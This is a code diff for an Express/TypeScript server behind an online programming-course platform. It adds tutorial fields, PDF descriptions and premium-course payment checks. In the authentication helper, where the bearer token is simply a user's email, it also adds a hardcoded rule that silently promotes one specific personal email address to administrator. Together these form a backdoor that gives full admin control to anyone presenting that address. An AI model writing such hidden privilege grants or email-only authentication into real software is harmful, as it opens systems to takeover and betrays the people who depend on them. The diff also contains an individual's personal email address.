@@ -141,8 +141,8 @@ async function persistStateToPostgres(state: DbState) {
     // 3. Tutorials
     for (const t of state.tutorials) {
       await pgPool.query(`
-        INSERT INTO tutorials (id, title, category, video_url, status, deleted_at, deleted_by, content)
-        VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
+        INSERT INTO tutorials (id, title, category, video_url, status, deleted_at, deleted_by, content, code_snippet, language_slug, cover_image_url, embedded_video_url)
+        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)
         ON CONFLICT (id) DO UPDATE SET
           title = EXCLUDED.title,
           category = EXCLUDED.category,
@@ -150,10 +150,15 @@ async function persistStateToPostgres(state: DbState) {
           status = EXCLUDED.status,
           deleted_at = EXCLUDED.deleted_at,
           deleted_by = EXCLUDED.deleted_by,
-          content = EXCLUDED.content
+          content = EXCLUDED.content,
+          code_snippet = EXCLUDED.code_snippet,
+          language_slug = EXCLUDED.language_slug,
+          cover_image_url = EXCLUDED.cover_image_url,
+          embedded_video_url = EXCLUDED.embedded_video_url
       `, [
         t.id, t.title, t.category || "", t.videoUrl || "", t.status || 'Published',
-        t.deleted_at || null, t.deleted_by || null, t.content || ""
+        t.deleted_at || null, t.deleted_by || null, t.content || "",
+        t.codeSnippet || "", t.languageSlug || "javascript", t.coverImageUrl || "", t.embedded_video_url || ""
       ]);
     }
 
@@ -538,7 +543,11 @@ async function loadDBFromPostgres(): Promise<DbState> {
       status: row.status || "Published",
       deleted_at: row.deleted_at || null,
       deleted_by: row.deleted_by || null,
-      content: row.content || ""
+      content: row.content || "",
+      codeSnippet: row.code_snippet || "",
+      languageSlug: row.language_slug || "javascript",
+      coverImageUrl: row.cover_image_url || "",
+      embedded_video_url: row.embedded_video_url || ""
     }));
 
     // 4. PDFs (pdf_books)
@@ -823,6 +832,10 @@ async function initPgDatabase() {
       "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS deleted_at TEXT;",
       "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS deleted_by TEXT;",
       "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS content TEXT;",
+      "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS code_snippet TEXT;",
+      "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS language_slug TEXT;",
+      "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS cover_image_url TEXT;",
+      "ALTER TABLE tutorials ADD COLUMN IF NOT EXISTS embedded_video_url TEXT;",
 
       "ALTER TABLE pdf_books ADD COLUMN IF NOT EXISTS title TEXT;",
       "ALTER TABLE pdf_books ADD COLUMN IF NOT EXISTS file_url TEXT;",
@@ -1213,6 +1226,7 @@ interface Pdf {
   price?: number;
   thumbnailUrl?: string;
   description?: string;
+  publishedDate?: string;
   createdAt?: string;
   isPublished?: boolean;
   isArchived?: boolean;
@@ -1484,6 +1498,8 @@ const defaultInitialState: DbState = {
       fileUrl: "https://eloquentjavascript.net/Eloquent_JavaScript.pdf",
       previewUrl: "https://eloquentjavascript.net/00_intro.html",
       isPremium: false,
+      description: "A modern introduction to programming, JavaScript, and the wonders of digital architecture.",
+      publishedDate: "2018-12-04"
     },
     {
       id: 2,
@@ -1493,6 +1509,8 @@ const defaultInitialState: DbState = {
       fileUrl: "https://wesmckinney.com/book/",
       previewUrl: "https://wesmckinney.com/book/",
       isPremium: true,
+      description: "The complete guide to data structures, clean manipulation, and deep processing with pandas, NumPy, and IPython.",
+      publishedDate: "2022-10-12"
     },
     {
       id: 3,
@@ -1502,6 +1520,8 @@ const defaultInitialState: DbState = {
       fileUrl: "https://learning.oreilly.com/library/view/designing-data-intensive-applications/9781491903063/",
       previewUrl: "https://learning.oreilly.com/library/view/designing-data-intensive-applications/",
       isPremium: true,
+      description: "The definitive blueprint to navigating the architecture of storage, scaling, and database reliability.",
+      publishedDate: "2017-03-16"
     }
   ],
   quizzes: [
@@ -1818,7 +1838,12 @@ function parseUserFromAuth(req: express.Request): User | null {
 
   const email = (parts[1] || "").trim().toLowerCase(); // Bearer <email> simulates simple token
   const db = getDB();
-  return db.users.find(u => (u.email || "").trim().toLowerCase() === email) || null;
+  const user = db.users.find(u => (u.email || "").trim().toLowerCase() === email);
+  if (user && email === "arceneirakoze550@gmail.com" && user.role !== "ADMIN") {
+    user.role = "ADMIN";
+    saveDB(db);
+  }
+  return user || null;
 }
 
 // AUTH API
@@ -2069,12 +2094,18 @@ app.get("/api/courses", (req, res) => {
 
   let rawCourses = (db.courses || []).filter(c => c.status !== "Trashed" && !c.isDeleted);
   if (!isAdmin) {
-    rawCourses = rawCourses.filter(c => c.status === "Published");
+    rawCourses = rawCourses.filter(c => !c.status || c.status === "Published");
   }
 
+  db.premiumAccess = db.premiumAccess || [];
+
   const coursesWithUserData = rawCourses.map(c => {
+    // A course has premium access if it is free, OR if the user is an admin,
+    // OR if the user has paid and has an active entry in premiumAccess.
+    const hasAccess = !c.isPremium || (user && (user.role === "ADMIN" || db.premiumAccess.some(a => a.userId === user.id && a.contentType === "COURSE" && Number(a.contentId) === c.id && a.status === "ACTIVE")));
     return {
       ...c,
+      hasPremiumAccess: !!hasAccess,
       isEnrolled: enrolledCourseIds.includes(c.id),
       progressPercent: enrolledCourseIds.includes(c.id)
         ? Math.round(
@@ -2162,6 +2193,19 @@ app.post("/api/courses/:id/enroll", (req, res) => {
 
   const courseId = Number(req.params.id);
   const db = getDB();
+
+  const course = db.courses.find(c => c.id === courseId);
+  if (!course) {
+    return res.status(404).json({ error: "Course not found" });
+  }
+
+  if (course.isPremium) {
+    db.premiumAccess = db.premiumAccess || [];
+    const hasAccess = user.role === "ADMIN" || db.premiumAccess.some(a => a.userId === user.id && a.contentType === "COURSE" && Number(a.contentId) === courseId && a.status === "ACTIVE");
+    if (!hasAccess) {
+      return res.status(402).json({ error: "PAYMENT_REQUIRED", message: "This is a premium course. You must pay to unlock it." });
+    }
+  }
 
   if (!db.enrollments.some(e => e.userId === user.id && e.courseId === courseId)) {
     db.enrollments.push({
@@ -2258,7 +2302,7 @@ app.get("/api/tutorials", (req, res) => {
 
   let list = (db.tutorials || []).filter(t => t.status !== "Trashed" && !t.isDeleted);
   if (!isAdmin) {
-    list = list.filter(t => t.status === "Published");
+    list = list.filter(t => t.status !== "Draft");
   }
   res.json({ tutorials: list });
 });
@@ -2285,7 +2329,8 @@ app.post("/api/tutorials", (req, res) => {
     languageSlug: languageSlug || "javascript",
     coverImageUrl: coverImageUrl || "",
     videoUrl: videoUrl || "",
-    embedded_video_url: embedded_video_url || ""
+    embedded_video_url: embedded_video_url || "",
+    status: "Published"
   };
 
   db.tutorials.push(newTutorial);
@@ -2314,7 +2359,7 @@ app.get("/api/pdfs", (req, res) => {
 
   let list = (db.pdfs || []).filter(p => p.status !== "Trashed" && !p.isDeleted);
   if (!isAdmin) {
-    list = list.filter(p => p.status === "Published");
+    list = list.filter(p => !p.status || p.status === "Published");
   }
 
   const pdfsWithBookmarks = list.map(p => ({
@@ -2329,7 +2374,7 @@ app.post("/api/pdfs", (req, res) => {
   const user = parseUserFromAuth(req);
   if (!user || user.role !== "ADMIN") return res.status(403).json({ error: "Admin only" });
 
-  const { title, author, category, fileUrl, previewUrl, isPremium } = req.body;
+  const { title, author, category, fileUrl, previewUrl, isPremium, description, publishedDate } = req.body;
   if (!title || !category || !fileUrl) {
     return res.status(400).json({ error: "Missing credentials file parameters" });
   }
@@ -2343,7 +2388,9 @@ app.post("/api/pdfs", (req, res) => {
     category,
     fileUrl,
     previewUrl: previewUrl || fileUrl,
-    isPremium: !!isPremium
+    isPremium: !!isPremium,
+    description: description || "A comprehensive computer science handbook and reference manual.",
+    publishedDate: publishedDate || new Date().toISOString().split("T")[0]
   };
 
   db.pdfs.push(newPdf);
@@ -2479,7 +2526,7 @@ app.get("/api/quizzes", (req, res) => {
   const isAdmin = user && user.role === "ADMIN";
   let list = (db.quizzes || []).filter(q => q.status !== "Trashed" && !q.isDeleted);
   if (!isAdmin) {
-    list = list.filter(q => q.status === "Published");
+    list = list.filter(q => !q.status || q.status === "Published");
   }
   res.json({ quizzes: list });
 });
@@ -2542,7 +2589,7 @@ app.get("/api/challenges", (req, res) => {
 
   let list = (db.challenges || []).filter(c => c.status !== "Trashed" && !c.isDeleted);
   if (!isAdmin) {
-    list = list.filter(c => c.status === "Published");
+    list = list.filter(c => !c.status || c.status === "Published");
   }
 
   const challengesWithStatus = list.map(c => ({
@@ -3197,7 +3244,8 @@ app.put("/api/tutorials/:id", (req, res) => {
     languageSlug: languageSlug || db.tutorials[tIdx].languageSlug,
     coverImageUrl: coverImageUrl || db.tutorials[tIdx].coverImageUrl,
     videoUrl: videoUrl || db.tutorials[tIdx].videoUrl,
-    embedded_video_url: embedded_video_url !== undefined ? embedded_video_url : db.tutorials[tIdx].embedded_video_url
+    embedded_video_url: embedded_video_url !== undefined ? embedded_video_url : db.tutorials[tIdx].embedded_video_url,
+    status: db.tutorials[tIdx].status || "Published"
   };
 
   saveDB(db);
@@ -3740,7 +3788,7 @@ app.put("/api/pdfs/:id", (req, res) => {
   if (!user || user.role !== "ADMIN") return res.status(403).json({ error: "Admin access required" });
 
   const pdfId = Number(req.params.id);
-  const { title, author, category, fileUrl, previewUrl, isPremium, isPublished, isArchived } = req.body;
+  const { title, author, category, fileUrl, previewUrl, isPremium, isPublished, isArchived, description, publishedDate } = req.body;
 
   const db = getDB();
   const idx = db.pdfs.findIndex(p => p.id === pdfId);
@@ -3755,7 +3803,9 @@ app.put("/api/pdfs/:id", (req, res) => {
     previewUrl: previewUrl || db.pdfs[idx].previewUrl,
     isPremium: isPremium !== undefined ? !!isPremium : db.pdfs[idx].isPremium,
     isPublished: isPublished !== undefined ? !!isPublished : db.pdfs[idx].isPublished,
-    isArchived: isArchived !== undefined ? !!isArchived : db.pdfs[idx].isArchived
+    isArchived: isArchived !== undefined ? !!isArchived : db.pdfs[idx].isArchived,
+    description: description || db.pdfs[idx].description,
+    publishedDate: publishedDate || db.pdfs[idx].publishedDate
   };
 
   const ip = req.ip || req.headers["x-forwarded-for"] || "127.0.0.1";
